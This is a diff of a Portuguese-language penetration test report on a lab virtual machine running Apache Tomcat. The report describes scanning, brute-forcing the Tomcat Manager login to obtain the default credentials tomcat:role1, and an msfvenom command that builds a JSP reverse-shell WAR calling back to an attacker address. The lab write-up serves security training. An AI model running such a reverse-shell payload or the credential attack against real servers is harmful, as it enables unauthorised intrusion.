@@ -1,5 +1,7 @@
 #Pentest Thales
+
 Este relatório apresenta os resultados do teste de intrusão realizado em uma máquina virtual hospedando um servidor web.
+
 O teste foi realizado no dia 06/03/2026 em um ambiente de laboratório controlado
 Foram utilziadas  as ferramentas netdiscover, nmap, feroxbuster e metasploit framework.
 Durante o teste de intrusão foi identificado um serviço web vulnerável. A exposição do painel administrativo Tomcat Manager permitiu o upload de uma aplicação maliciosa contendo um payload de reverse shell, resultando em execução remota de código (RCE) no servidor.
@@ -15,15 +17,23 @@ Exposição de Painel Administrativo	Média (5.3)	Reconhecimento Web / Feroxbust
 
 
 ##Detalhamento Técnico
+
 O processo iniciou com o uso do netdiscover, identificando o host alvo no IP 192.168.56.102. Subsequentemente, o nmap revelou os seguintes serviços ativos:
+
 Porta 22/TCP: OpenSSH 7.6p1.
 Porta 8080/TCP: Apache Tomcat 9.0.52.
-3.2 Descoberta de Diretórios e Brute Force
+
+Descoberta de Diretórios e Brute Force
+
 Utilizando a ferramenta feroxbuster com a wordlist big.txt, mapeou-se o diretório crítico /manager/html. Através do Metasploit Framework (módulo scanner/http/tomcat_mgr_login), foi realizado um ataque de dicionário.
+
 Resultado: Credenciais obtidas com sucesso (tomcat:role1), confirmando o uso de senhas padronizadas e inseguras.
-3.3 Exploração (Ganhando Acesso)
+
+Exploração (Ganhando Acesso)
+
 Com acesso ao painel de gerenciamento, foi gerado um payload de reverse shell via msfvenom:
 msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.56.101 lport=4444 -f war > shell.war 
+
 O arquivo shell.war foi implantado (deploy) no servidor. Após a execução, foi estabelecida uma conexão reversa, resultando em uma shell interativa como o usuário tomcat no host miletus.
 
 ##Evidências Técnicas
